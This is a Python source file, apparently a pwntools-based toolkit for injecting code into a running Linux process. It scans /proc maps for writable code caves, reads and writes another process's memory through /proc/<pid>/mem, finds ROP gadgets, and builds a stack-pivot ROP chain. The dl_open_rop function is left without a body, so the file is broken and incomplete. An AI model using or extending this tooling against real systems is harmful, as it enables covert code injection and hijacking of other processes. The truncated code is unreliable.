from pwn import *

PAGE_SIZE = 4096


def print_matching_ranges_hex(ranges):
    for start, size, symbol in ranges:
        print(f"\tstart: {start:#010x}, size: {size:#010x}, symbol: {symbol}")


def parse_proc_maps(pid, query_string: str = 'r--p') -> list:
    maps_file_path = f'/proc/{pid}/maps'

    try:
        with open(maps_file_path, 'r') as file:
            lines = file.readlines()

        matching_ranges = []

        for line in lines:
            parts = line.split()
            address_range = parts[0]
            permissions = parts[1]
            pathname = parts[-1] if len(parts) >= 6 else ''

            if query_string in permissions:
                address_hex_start = int(f'0x{address_range.split("-")[0]}', 16)
                address_hex_end = int(f'0x{address_range.split("-")[1]}', 16)
                mapped_size = address_hex_end - address_hex_start
                matching_ranges.append((address_hex_start, mapped_size, pathname))
        return matching_ranges

    except FileNotFoundError:
        log.error(f"Process with PID {pid} does not exist or maps file not found.")
        return []
    except PermissionError:
        log.error(f"Permission denied to access the maps file for PID {pid}.")
        return []


def find_cave(pid, shellcode_length: int) -> int:
    writeable_executable_mappings = parse_proc_maps(pid, 'w')

    for map_start, map_size, _ in writeable_executable_mappings:
        if map_size < shellcode_length:
            continue

        with open(f'/proc/{pid}/mem', 'rb') as mem:
            for offset in range(0, map_size - shellcode_length + 1):
                mem.seek(map_start + offset)
                data = mem.read(shellcode_length)
                if b'\x00' * shellcode_length in data:
                    aligned_offset = ((map_start + offset) // PAGE_SIZE) * PAGE_SIZE
                    if aligned_offset + shellcode_length > map_start + map_size:
                        continue
                    return aligned_offset

    return -1


def read_memory(pid, address: int, num_bytes: int):
    with open(f'/proc/{pid}/mem', 'rb') as mem_file:
        mem_file.seek(address)
        return mem_file.read(num_bytes)


def write_memory(pid, address: int, content: bytes):
    with open(f'/proc/{pid}/mem', 'wb') as mem_file:
        mem_file.seek(address)
        mem_file.write(content)


def getsize(mem):
    start = "0x" + mem["start"]
    end = "0x" + mem["end"]
    size = int(end, 16) - int(start, 16)
    return size


def find_gadget(gadget, mem, pid):
    size = getsize(mem)
    start = int("0x" + mem["start"], 16)
    with open('/proc/' + pid + '/mem', "rb") as file:
        file.seek(start)
        data = file.read(size)
    offset = data.find(gadget)
    if offset != -1:
        result = offset + start
    else:
        result = offset
    log.info(f"found gadget: {gadget} at {hex(result)}")
    return result

def parse_maps_entries(line):
    parsed = {}
    info = line.split(" ")
    parsed['name'] = info[-1]
    addresses = info[0].split("-")
    parsed['start'] = addresses[0]
    parsed['end'] = addresses[1]
    parsed['perms'] = info[1]
    return parsed

def parse_maps(pid):
    final = {}
    binaries = []
    with open('/proc/' + pid + '/maps', "r") as file:
        data = file.read().split("\n")[:-1]
    for x in data:
        if "[stack]" in x:
            final["stack"] = parse_maps_entries(x)
        elif "r-xp" in x:
            binaries.append(parse_maps_entries(x))
        else:
            continue
    final["bin"] = binaries
    return final

def dl_open_rop(pid, address, so_path):


def stack_pivot_rop(target_binary, bss_addr, libc):
    rop = ROP(target_binary)

    try:
        pop_rsp_ret = rop.find_gadget(['pop rsp', 'ret'])[0]
    except Exception:
        rop = ROP(libc)
        pop_rsp_ret = rop.find_gadget(['pop rsp', 'ret'])[0]

    rop.raw(pop_rsp_ret)
    rop.raw(bss_addr)

    rop_chain = rop.chain()
    log.info('stack pivot ROP chain (addresses):')
    for i in range(0, len(rop_chain) - 7, 8):  # Adjusted loop to avoid unpacking incomplete chunks
        chunk = rop_chain[i:i + 8]
        if len(chunk) == 8:  # Ensure the chunk is exactly 8 bytes
            addr = struct.unpack("<Q", chunk)[0]  # Little-endian format
            print(f'\t0x{addr:016x}')
        else:
            log.warning(f'Incomplete chunk at the end of the ROP chain: {chunk.hex()}')

    return rop_chain


class SyscallInfo:
    def __init__(self, syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip):
        self.syscall_num = syscall_num
        self.rdi = rdi
        self.rsi = rsi
        self.rdx = rdx
        self.r10 = r10
        self.r8 = r8
        self.r9 = r9
        self.rsp = rsp
        self.rip = rip

    def __repr__(self):
        return (
            f"SyscallInfo(\n"
            f"  syscall_num={hex(self.syscall_num)},\n"
            f"  rdi={hex(self.rdi)},\n"
            f"  rsi={hex(self.rsi)},\n"
            f"  rdx={hex(self.rdx)},\n"
            f"  r10={hex(self.r10)},\n"
            f"  r8={hex(self.r8)},\n"
            f"  r9={hex(self.r9)},\n"
            f"  rsp={hex(self.rsp)},\n"
            f"  rip={hex(self.rip)}\n"
            f")"
        )


def parse_proc_syscall(pid):
    syscall_file = f'/proc/{pid}/syscall'

    try:
        with open(syscall_file, 'r') as f:
            content = f.read().strip()

        values = content.split()

        syscall_num = int(values[0], 16)
        rdi = int(values[1], 16)
        rsi = int(values[2], 16)
        rdx = int(values[3], 16)
        r10 = int(values[4], 16)
        r8 = int(values[5], 16)
        r9 = int(values[6], 16)
        rsp = int(values[7], 16)
        rip = int(values[8], 16)

        return SyscallInfo(syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip)

    except FileNotFoundError:
        log.error(f"/proc/{pid}/syscall not found")
        return None
    except Exception as e:
        log.error(f"Error parsing syscall file: {e}")
        return None
